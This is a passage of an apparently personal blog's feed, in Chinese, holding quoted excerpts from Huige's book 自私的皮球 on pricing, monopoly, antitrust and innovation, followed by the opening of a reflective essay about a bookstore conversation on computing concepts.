&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;酒水溢价也可视为饭店对喝酒客人额外占用的座位资源所收取的租金，座位资源属饭店核心资源，而“翻台率”也是饭店管理的重要指标&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;用耗材用量识别出高强度用户，用酒水需求识别出休闲和宴请型食客&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大卖场既不像传统零售业以批零差价为单一收益来源，也不像有些商场转向以摊位租金为主要收入的商业地产，相反，它以颇为复杂的方式结合了两种商业模式，既赚取批零差价，也以进场费和促销费等形式获取场地租金，而正是后者的复杂和不确定性带来了抱怨和纠纷。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大卖场最核心的资源是它的货架空间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;把皮球踢给供应商，让他们自己竞争决定，而他自己只负责安排一个竞价机制...这样经过几轮替换，空间分配格局将自动趋向最优。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;任何大卖场一旦开张必定拥有某些垄断地位，而供应商无论如何都要为此支付租金，即便政府禁止收进场费，租金仍会以其他方式支付&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;报纸价格高于零只是为了防止被直接送去废品站，如果报社确信你会认真阅读，他会很乐意免费赠阅，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;正如将人流引导聚集到一处可以收获人气租金，将视线聚集到一处可以收获眼球租金&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;商业地产商都懂得引入知名商家来聚集人气的道理&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为国企没有追求利润的激励，再高的销售价格，都可以化为诸如万元一次的过节费之类的进入成本项，国企永远能摆出足够多的数字来证明它的确在亏损或“勉强维持”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;专营制度或许能实现“国计”，但显然无益于“民生”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;任何时候，被榨取剩余的，总是那些需求更迫切（因而支付意愿更高）的消费者，所以也谈不上不“公平”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;价格有两个基本作用：首先，作为一种竞争性分配机制，它以简单有效的标准——价高者得，将当前产出在众多需求者之间进行分配，结果就是市场出清；其次，作为一种市场信号，它为生产者和消费者作出生产和消费决定提供了简洁明了的指导：觉得这个价格有利可图就继续生产，觉得这个价格合算就买。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;价格信号是市场参与者可以依赖的主要信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外行总是用“炒”这个语义含糊的词，去笼统地指称投机和操纵这两种十分不同的市场行为。投机行为无处不在，但操纵却很难成功，尤其在一个充分竞争的大规模市场上，要与市场较劲需要很大能量，才能获得影响价格走势所需的交易规模，并且还要防范你的对手。假如操纵意图果真那么容易被记者纷纷识破，几乎可以肯定会被反向操作者打败。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这些评论家显然都是没做过生意的书生，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;凡生产决策与商品交易之间存在信号时滞的地方，这种形式的波动便可能发生&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;各国的保护性农业政策，与其说是在帮助农民，或者推进农业，不如说是将农业和农村尽可能维持在传统的那种状态下，以便满足城里人的怀旧偏好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;实际上，帮助农民的最好办法就是消灭农民。农民之弱势并非个体能力之弱，而是产业模式之弱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于生产者，其扩大产能的投资决定，取决于对未来的预期，而投资一旦做出，其投入便成了沉没成本，不再影响其供给意愿。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;通过比较需求的价格弹性，我们区分了必需品和奢侈品&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;规模化的好处在风险应对上体现为能够利用各种风险管理所需的金融工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;（自然垄断中）无论垄断者如何绞尽脑汁压榨消费者，它实际上总是当时的技术和商业条件下消费者所可能找到的最便宜的卖家，这是因为每个垄断者身边，随时有着无数潜在竞争者虎视眈眈、伺机而动&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;双边垄断格局下的单次博弈不存在均衡解，即双方都无法预期对方可接受的价格是多少...所有这些都是为了探查对方价格底线、达成交易的迫切度以及让步的可能性...这一过程将伴随着尔虞我诈、虚张声势、烟幕弹，还有商业贿赂和间谍，所有这些都会带来高昂的交易费用，而它们在常规竞价中是不存在的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;双边垄断在产业中不多见，但其实在生活中却很普遍，如爱情，假如双方相爱到了非她不娶非他不嫁的程度，那么他们之间的许多事情——买什么样的房子？怎么装修？如何养育孩子？如何配置家庭资产？如何赡养长辈？——就变成了双边垄断交易。这大概就是为何家务事如此难缠，而家庭总是充满了争吵的原因吧，因为双边垄断格局下的议价实在太困难.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;长期合作关系中形成的信任关系，以及历年反复谈判中获得的对对方策略、底线、风格甚至谈判用语的熟悉和领悟能力；最后，谈判要成功，还需要双方都确信这不是最后一次交易，否则，各方便有足够动机在最后的晚餐里勒索一把&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大部分用户都在搭少数广告点击者的便车。按福利经济学理论，这样的产品只有靠政府补贴才会出现，可实际上，Google不仅出现了，还活得很好，收益丰厚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;反垄断诉讼和干预也从未达到过这样的目的，它们仅有的作用，是延缓了竞争失败者被淘汰的进程，限制了企业的竞争手段&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;或许某些爱情是例外，据说一些非她不娶的痴情者会不惜倾家荡产甚至搭上性命和荣誉。当然，我们的法律和道德从未试图拯救痴男怨女，相反，大量笔墨口舌还被用来赞美他们对垄断者的执迷不悟&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;专利法、商标法和著作权法，其所保护的，无一不是垄断资源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一方面我们用诸多法律来保护资源的垄断权，而同时，当生产者运用这些垄断权来销售产品，占领市场，获取收益和战胜竞争者时，却要用反垄断法来惩罚他们。这一悖论凸显了反垄断法在我们的道德体系和法律传统中的不和谐地位，它显然有悖于广受认可的基本道德和法理原则。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;第三种自然垄断叫“赢家通吃”...即越流行越值钱。如一部电话的价值，极度依赖于其可能通话对象的数量，因而当若干各自封闭的电话网相互竞争时，用户数便成为决定性因素。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;垄断一旦建立，便成为寻求创新的最大动力，人们会想尽一切办法突破它；当垄断使得一个产业日趋封闭时，就有人会尝试绕过它另起炉灶，开辟全新的替代产业，而垄断者若沉溺于旧模式，便会连同他所垄断的产业一起被边缘化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;之所以会走进死胡同，常常是因为它们一度在某方面过于成功，因而在自然选择引导下过度发展了这方面的能力，最终对这种能力形成依赖&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;树袋熊垄断了桉树林，其他动物可以另辟蹊径。上帝并未从他的天堂里跳下来，责令树袋熊不得控制超过70％的桉树林，或者把它们改造成三个独立物种&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;产业史上一度不可一世的垄断巨头们，很少被从正面打败，他们总是随其所在产业被新兴产业排挤而被边缘化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;理论取代旧理论，从来不是因为旧理论的信奉者被驳倒认输了、心服口服了，然后新理论确立了，而是因为老头们退休了、死了、没人选他们课、看他们书、引用他们观点了，于是旧理论消失了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;浏览器和云计算正在绕过桌面和操作系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于企业家和创新者而言，唯一绕不过的垄断者，恰恰是政府和它的反垄断刀斧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;微软大可以仍抱着其封闭的桌面系统，悠闲地苟活于信息产业之一角，正如今天树袋熊仍在快乐地独自啃着它的桉树叶，但那时的信息业早已天翻地覆，或许很少有人会想起微软的名字了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中小厂商得以立足的诀窍便是实施差异化和寻找特殊生态位&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但这一矛盾仅对书呆子经济学家才是矛盾&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不妨把创新分为三类，第一类是对已有商品的局部改进，即所谓的微创新，第二类是用一种全新的方式来满足此前由其他商品来满足的需求，比如汽车相对于铁路，第三类是挖掘出一种全新的需求并加以满足，比如太空旅行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每个创新者从他构思新产品和新商业模式的那一刻起，最关切的事情莫过于如何确保其创新价值不被大批模仿者迅速淹没&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;砸破一块窗玻璃能给玻璃制造商和安装工带来6法郎的生意，这是看得见的；而另一方面，窗户主人将这6法郎花在换玻璃上，就不能再花在别的事情上，因而减少了其他消费品厂商原本会得到的6法郎生意，这是看不见的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;指望凭借未来垄断地位获取创新回报的潜在创新者因此打消了实施创新的念头，因而消费者也就无法享受到这些创新带给他们的好处&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 02 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-02:zi-si-de-pi-qiu-1.html</guid><category>book</category></item><item><title>自私的皮球.第二部分</title><link>/zi-si-de-pi-qiu2.html</link><description>&lt;p&gt;---摘自辉格《自私的皮球》---&lt;/p&gt;
&lt;h2&gt;第二部分 产业与创新&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;实际上这些讨论和解释只是尝试性的，不妨将它们看作商学院的案例练习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;产业结构可以视为市场的资源配置机制在某个时刻所达致的状态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;企业如何将各种资源组织成一个“有机”的实体，以确立其在特定产业生态位下的生存基础&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当创新作为一个商业主题而被谈论时，它更多的是指对已有资源的重新配置，从这个角度看，创新就是企业家发现并纠正市场资源配置错误的过程&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有异乎寻常的风险偏好和进取精神才能驱动一些人持续从事创新活动，这就是熊彼特所说的企业家精神，它是特定文化和制度背景的产物。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;持续的创新离不开有利的制度和商业环境，而其中最重要的莫过于现代金融和资本市场&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;资本市场让拥有独特知识背景的创新者能与具有他们所缺乏的抗风险能力的大资本相遇，而金融市场所提供的风险配置和分摊机制，使得创新的高风险变得能被个人所承受&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大型数据库和数据挖掘技术有了长足发展，由此面向海量客户的信用评估和信贷产品成为可能，信用卡等个人金融产品才得以繁荣发展&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;价值观是个相对稳定的因素，但也并非一成不变，随着制度、经济形态和社会结构的变迁，人们的价值观也会改变，虽然常常是滞后的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;第一种策略假定消费者的偏好及其背后的价值观是给定的，即消费者知道自己需要什么，企业要做的是理解消费者的需要，并以最高的效率、最低廉的价格来满足它;第二种策略则认为消费者的价值观是可以被引导和塑造的，企业需要主动进行这种引导，并将自己的品牌形象植入其中，以此取得消费者忠诚度和市场领导地位。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最成功的消费品企业是后一种，他们善于制造生活方式，他们会让15岁的高中生相信：眼下做一个最酷的年轻人要会挂着iPod跳街舞、会背着背包蹬山地车兜风、会在球场上运球过人——当然是穿着耐克球鞋&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们用一连串故事和明星将一种价值观包装成一个梦想&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;经济学以“偏好不变”为其基础假设，自然无法理解何以能创造价值观。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;运动对于个人的价值不仅在于它本身带来的快乐和健康，还在于它可以体现运动者的一种情调、生活态度和价值取向，因而当一个人出门去做运动时，他同时也是在告诉他人：我是这样一个爱运动的、充满活力的、积极向上的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这一机制使得谷歌公司更像一个风投，他把20％的劳动资源用作无特定目标的种子基金&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;创新原本就是无法管理的。创新之为创新，便在于其不确定性和不可预见性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;产品开发的极短周期、新功能的迅速引入、极低的型号固定成本、功能组合的广谱试错，这些才是山寨模式的精髓所在，其中有许多值得品牌厂商反思和学习的地方。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;过去五年给非洲带来最大最深刻变化的东西，就是手机，而其中绝大部分是来自中国的山寨机。这一变化的效果，或许是那些在非洲呕心沥血了数十年的国际援助组织从未梦想过的，但它却由远在广东、对非洲的贫穷漠不关心、唯利是图的山寨厂商在短短几年内就做到了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;差额又超出事情败露所带来的损失风险时，打假球便成了理性选择&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;清除假球需要一种机制来确保正面激励大于反面激励。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从历史和各国经验看，只要有足球，赌球的需求便无法遏制。将赌博置于非法地位，并不能阻止赌博的广泛存在，反而给黑社会创造了巨大财源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;足球之所以成为受热烈追捧的赌博题材，正是因其结果的高度不确定性和不可干预性，这也是一切赌博题材的核心特征&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;而经常作弊的球队和裁判就会被赌客所抛弃；一旦正面激励额被众多散户投注抬高，贿赂门槛便会高得令潜在贿赂者望而却步&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不要试图与本能做对。人们曾构想出各种制度，试图遏制那些普遍而强烈的、有着先天基础的欲望，却没有意识到，这些欲望恰恰为激励机制提供了基础，好的机制正是以它们为把手，来引出设计者希望看到的行为&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;工资是劳动的价格&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在现代社会，企业已成为最重要的组织——至少与家庭一样重要，如果不是更重要的话，它已成为多数成年男女谋求生计和安身立命之处&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;企业不仅是支付报酬的雇主，更是他们寻求价值认同和群体庇护，为自己寻找在群体中恰当位置，从而获得一个“身份”的地方；尤其是大企业，本身已成为一个众多员工生活于其中的社会&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;投资与经营日益分离，职业经理人兴起，这一系列并行交错的进程中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;企业无非是完成某种生产所需的一堆资源，经由交易或契约关系而组合在一起，而企业家的工作，是为特定生产找出恰当的资源组合，然后从市场上买来或租来这些资源从而实现这一组合&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有当组织目标和相应的激励控制机制都实现非人格化之后，企业才能成为一个可自我持续的有机组织，一个铁打的营盘。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;老板把你提到一个高的离奇的收入水平上，一旦你对这一水平形成依赖，你在有机会做出有损企业利益的事情时，就会面临高昂的机会成本，高到足以让你打消任何此类念头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;(春节)在短短二十多天里，高频度的走亲访友、老友重聚，出席许多因在外打工而被推迟了的婚宴，大量关于就业机会、雇主品质和价格的信息在其间被交换；并且，与同龄人的境遇对比、对新型消费与生活方式的重新认知，以及家人亲友的评价、期待和督促中，将激发他们对未来的人生规划作出调整。当他们再次返回市场时，指导其选择和议价的已是一套新的信息背景和价格期望&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;求职择业不仅仅是以劳动换工资的交易，也是个人为自己寻找社会定位、选择身份和安排生活方式的过程，职业规划是人生规划的核心部分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;随着进城人群逐渐在城市定居下来，长辈逐渐老去或者被接进城市赡养，上述文化纽带日益松散，最终将会断裂，那时，乡村将成为遥远而朦胧的回忆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;企业是“有机”的；这一生物学隐喻有几层意思：企业的业务和职能组成不是可以任意分割的，其边界不是可以随意重划的，新业务不是可以随意加入的，相反，各部分之间必须相互兼容，而所有这些也都是生物有机体的特征。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就像让外科医生给自己的儿子做截肢手术一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一出经典的悲剧。建立企业的最初目标是盈利，但是和其他组织一样，企业一旦建立，一种组织和运营模式一旦长期存在，便会发展出其特有的文化和价值观，原本用于实现其他目标的工具逐渐获得了独立价值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;良好的企业文化和价值观,可以用来吸引来原本需要高得多的薪水才能吸引到的人才&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;文化是一种强大的组织力量；而另一方面，文化惯性常常让企业抗拒价格信号的引导，抵制市场环境和产业生态施加于企业的变革压&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;新兴工业国的发展也造就了一个庞大的中产阶级，随之而来的将是同样庞大的健康医疗需求，而生物科技的快速进步，把许多疾病从不治变成可治，更推动了全球医疗业的繁荣。认定能源和医疗为两个新的增长点，看来有充足的依据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;今天的手机不仅是消费品，而且像衣服、首饰、古人的佩剑、绅士的手杖、牛仔的猎枪和硅谷新贵的跑车一样，成了身体的某种延伸物。被人们用作展现自己个性、情趣和社会定位的标志。一种消费品一旦获得这种身份符号的地位，其消费模式便与其他商品大不相同。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;乔布斯式略带邪教气质的感召力在创造符号产品过程中的关键作用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;可持续的发展要求一个战略性的长期盈利模式，即你必须建立一些独特的、短期内难以被替代的资源，如微软的平台依赖性、诺基亚的市场份额、苹果的品牌号召力和AppStore、谷歌的信息通道和多种杀手级应用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如一个企业的重要人物整天都在跑关系，上下钻营，用吃喝嫖赌取悦官员和客户，想着法子给他们塞钱，琢磨他们和他们子女的癖好，揣摩这些人的关系、地位和前途，为的只是几个图章和订单，那么，这些就不仅仅是负担，它们将塑造整个企业的文化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如企业的生存发展高度依赖于这些事情做得好不好，那么，热衷并擅长此道的那些人无疑将如鱼得水、步步高升、扬眉吐气，也意味着企业其他资源的价值被贬低了，原本应是核心资源的技术、生产和管理能力成了次要资源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;跨国公司在第三世界国家常宁愿让本地代理商去处理这些事情，这是明智的选择，除了信息障碍、法律风险和公共形象，企业文化遭受腐蚀的危险恐怕也是重要的考虑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;任何厂商要在竞争中长期立足，必须拥有某些垄断性资源，或者说“独特的优势”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;然而，任何垄断地位都是对他人的诱惑，人人都想找出替代资源，同行们想用替代品从原本由你独享的垄断租金中分得一杯羹，而你的买家们则希望足够多的替代品能让他们免付这笔租金。所以，你无时无刻不在丧失生存基础的危险之中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;报纸必须达到最小发行量来支撑它的采编团队。它能否做到这一点，取决于它能否从成本可行的发行半径内的识字人口中，找出足够大的共同兴趣集合。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;潘朵拉盒子既已打开，就收不回去了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;劣币逐良币的意思是，商品的某项品质，若分布于一个消费者无法分辨或即便有所分辨也不影响其选择的区间，那么，该品质最终将下降到这一区间的下限，即品质高于该水平的商品将从市场消失&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;格雷欣法则的原理很简单，创造和提供品质都是有成本的，若额外的品质不能影响消费选择，厂商自然不愿意负担这项成本。一种常见的情况是，当一个市场突然涌入大批缺乏经验和辨别力的新手时，格雷欣法则便会启动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;抱怨，冲突，丑闻开始泛滥，但恰是这个时候，建立品牌鸿沟的机会来了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好的产业不必是创造最优品质的产业，而是最能满足需求的产业，抱怨和纠纷并不是品质差的结果，而是品质不符合预期的结果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;消费群的规模、收入结构和偏好分布，是产业生态的环境条件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 02 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-02:zi-si-de-pi-qiu2.html</guid><category>book</category></item><item><title>观念.缘起</title><link>/idea-begin.html</link><description>&lt;p&gt;近期打算在这个分类下，梳理一下我的观念中hard core的部分。&lt;/p&gt;
&lt;h2&gt;0&lt;/h2&gt;
&lt;p&gt;最近发生了好些事，我一贯反应迟钝，还理不清它们对我的意义。&lt;/p&gt;
&lt;p&gt;但它们都促使我去理清我的观念&lt;/p&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;前几周在凤凰国际书城，我在翻《计算的本质》，旁边有个家伙打了个招呼，之后我们盘腿而坐，从下午聊到晚上，他说自己对计算机感兴趣，积累了些问题，问我是否愿意回答他的一些疑问。谈话以他的问题为线索。在问题里，从SICP ，通灵芯片 到《集体智慧编程》都谈及，递归 / 人月神话 / 复杂度 / 沟通成本公式 这些他也都很清晰，显然不只是感兴趣。而我在解释概念时，他会反复追问术语，要求我用自己的话表述，声明他“是一个未入门的人，听不懂术语”。这样一来，我发现，我对许多概念其实是一知半解的，而之前却以为自己理解了。&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;h3&gt;2.1&lt;/h3&gt;
